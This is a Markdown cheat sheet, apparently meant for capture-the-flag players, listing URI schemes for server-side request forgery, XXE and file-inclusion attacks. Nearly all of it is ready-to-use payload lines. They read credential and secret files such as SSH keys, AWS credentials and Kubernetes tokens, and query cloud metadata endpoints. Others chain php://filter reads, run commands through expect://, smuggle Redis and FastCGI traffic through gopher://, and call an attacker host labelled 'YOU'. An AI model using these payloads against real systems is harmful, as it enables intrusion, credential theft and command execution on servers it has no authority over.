# URI Schemes — deep — every fetch-able protocol

## `file:` — the read scheme

### POSIX

```
file:///etc/passwd
file:///etc/shadow
file:///root/flag
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd
file:///proc/self/exe
file:///proc/self/status
file:///proc/self/fd/0..N
file:///proc/self/maps
file:///proc/1/environ
file:///proc/net/tcp
file:///proc/net/udp
file:///proc/net/arp
file:///dev/stdin
file:///dev/stdout
file:///dev/fd/0
file:///sys/class/net/eth0/address    — MAC address
file:///sys/fs/cgroup/...             — cgroup — container fingerprint
file:///var/log/...
file:///etc/nginx/nginx.conf
file:///etc/apache2/...
file:///etc/ssh/sshd_config
file:///etc/php/.../php.ini
file:///etc/mysql/my.cnf
file:///etc/mysql/debian.cnf          — debian-sys-maint creds!
file:///etc/redis/redis.conf
file:///etc/mongod.conf
file:///etc/postfix/main.cf
file:///etc/resolv.conf
file:///etc/sudoers
file:///root/.ssh/id_rsa
file:///root/.bash_history
file:///root/.aws/credentials
file:///root/.kube/config
file:///root/.docker/config.json
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/lib/docker/...
file:///app/...
file:///opt/...
file:///usr/share/...
file:///usr/local/...
file:///home/ctf/.bash_history
file:///home/ctf/flag
file:///home/ctf/.ssh/id_rsa
file:///home/ctf/.aws/credentials
file:///home/ctf/.my.cnf
file:///home/ctf/.pgpass
file:///home/ctf/.env
```

### Windows

```
file:///c:/windows/win.ini
file:///c:/boot.ini
file:///c:/windows/system.ini
file:///c:/windows/system32/drivers/etc/hosts
file:///c:/windows/system32/drivers/etc/services
file:///c:/windows/system32/license.rtf
file:///c:/windows/system32/eula.txt
file:///c:/windows/debug/NetSetup.log
file:///c:/windows/iis6.log
file:///c:/windows/panther/unattend.xml
file:///c:/windows/panther/Unattend.xml
file:///c:/windows/panther/unattend/unattend.xml
file:///c:/sysprep/sysprep.xml
file:///c:/sysprep.inf
file:///c:/inetpub/wwwroot/web.config
file:///c:/inetpub/wwwroot/global.asax
file:///c:/inetpub/wwwroot/iisstart.htm
file:///c:/inetpub/logs/LogFiles/W3SVC1/...
file:///c:/inetpub/adminscripts/
file:///c:/inetpub/wwwroot/aspnet_client/
file:///c:/xampp/php/php.ini
file:///c:/xampp/htdocs/config.php
file:///c:/xampp/apache/conf/httpd.conf
file:///c:/wamp/www/config.php
file:///c:/wamp64/www/...
file:///c:/php/php.ini
file:///c:/phpMyAdmin/config.inc.php
file:///c:/Program Files/...
file:///c:/ProgramData/...
file:///c:/Users/Administrator/Desktop/flag.txt
file:///c:/Users/Administrator/AppData/Roaming/
file:///c:/Users/*/Desktop/flag.txt
file:///c:/Users/*/Documents/
file:///c:/Users/Public/...
file:///c:/Users/Default/...
file:///c:/Windows/System32/inetsrv/config/applicationHost.config
file:///c:/Windows/System32/inetsrv/config/administration.config
file:///c:/Windows/System32/inetsrv/config/redirection.config
file:///c:/Windows/Microsoft.NET/Framework*/v*/CONFIG/machine.config
file:///c:/Windows/Microsoft.NET/Framework*/v*/CONFIG/web.config
file:///c:/Windows/Temp/...
file:///c:/ProgramData/MySQL/MySQL Server*/my.ini
file:///c:/Program Files/MySQL/MySQL Server*/my.ini
```

### The relative-file forms

```
file:/etc/passwd              — single-slash — some parsers
file://etc/passwd             — host-form — rare
/etc/passwd                   — bare path — treated as relative-file
file:etc/passwd               — relative-file
file:///./etc/passwd          — .-normalize
file:///../etc/passwd         — traversal-in-file
file://%2e%2e/etc/passwd      — encoded traversal
file:///etc/./passwd          — .-in-path
file:///etc//passwd           — double-slash
```

## `http:`/`https:` — the fetch scheme

```
http://127.0.0.1:80/
http://127.0.0.1:8080/admin
http://localhost/
http://[::1]/
http://169.254.169.254/latest/meta-data/         — AWS
http://169.254.169.254/latest/user-data/
http://169.254.169.254/computeMetadata/v1/        — GCP
http://169.254.169.254/metadata/instance?api-version=...
http://metadata.google.internal/computeMetadata/v1/
http://100.100.100.200/latest/meta-data/          — Alibaba
http://metadata.tencentyun.com/                   — Tencent
http://168.63.129.16/metadata/instance            — Azure
http://169.254.170.2/v2/metadata                  — ECS
http://localhost:2375/version                     — docker socket
http://localhost:2376/containers/json
http://unix:/var/run/docker.sock
http://internal-service/
http://kubernetes.default.svc/
http://vault:8200/v1/secret/...
http://consul:8500/v1/kv/...
http://etcd:2379/v2/keys/
http://admin.local/
http://backend.internal/
```

## `php://` — PHP streams

```
php://filter/convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=./index.php
php://filter/read=convert.base64-encode/resource=/flag
php://filter/convert.base64-decode/resource=/flag
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/convert.iconv.ucs-4le.ucs-4/resource=/flag
php://filter/convert.quoted-printable-encode/resource=/flag
php://filter/convert.uuencode/resource=/flag
php://filter/zlib.deflate/convert.base64-encode/resource=/flag
php://filter/zlib.inflate/resource=/x.gz
php://filter/bzip2.compress|convert.base64-encode/resource=/x
php://input
php://output
php://stdin
php://stdout
php://stderr
php://memory
php://temp
php://fd/3
php://filter/convert.base64-encode/resource=php://input
php://filter/convert.base64-encode/resource=php://filter/...
```

## `phar://` — PHP phar

```
phar:///path/to/x.phar/a
phar://./uploads/x.phar/y
phar:///tmp/x.jpg/y               — renamed phar
```

## `expect://` — PHP exec

```
expect://id
expect://cat%20/flag
expect://cat$IFS/flag
expect://ls%20-la%20/
```

## `jar:`/`netdoc:` — Java

```
jar:file:///x.jar!/y
jar:http://YOU/x.jar!/y
jar:file:///app.war!/WEB-INF/web.xml
jar:file:///app.war!/WEB-INF/classes/application.properties
netdoc:///etc/passwd
netdoc://host/path
```

## `ftp:` — FTP

```
ftp://YOU/file
ftp://USER:PASS@host/file
ftp://anonymous:a@b@host/file
```

## `data:` — libxml2

```
data:text/plain,hello
data:text/plain;base64,aGVsbG8=
data:,text
```

## `smb`/UNC — Windows

```
file://\\YOU\share\x
file://\\127.0.0.1\c$\windows\win.ini
\\YOU\share\x
file://\\?\c:\windows\win.ini
```

## `gopher:`/`dict:`/`ldap:`/`tftp:`/`sftp:` — the legacy tier

```
gopher://host:6379/_*1%0d%0a$4%0d%0aPING%0d%0a
gopher://127.0.0.1:9000/_%01%01...       — fastcgi
dict://host:11211/stats
dict://host:6379/info
ldap://host:389/dc=x
tftp://host/file
sftp://user:pass@host/path
scp://user@host/path
telnet://host:port/
```

## `mailto:`/`news:`/`nntp:` — the dead tier

```
mailto:x@y                    — not a resolver
news:x                        — not a resolver
nntp://host/x                 — not a resolver
```

## The "the scheme is the fingerprint" — which scheme resolves tells you the parser

- `file:`+`jar:`/`netdoc:` → Java
- `file:`+`php://`+`expect://` → PHP
- `file:`+`data:` → libxml2
- `file:`+`smb:`/UNC → .NET on Windows
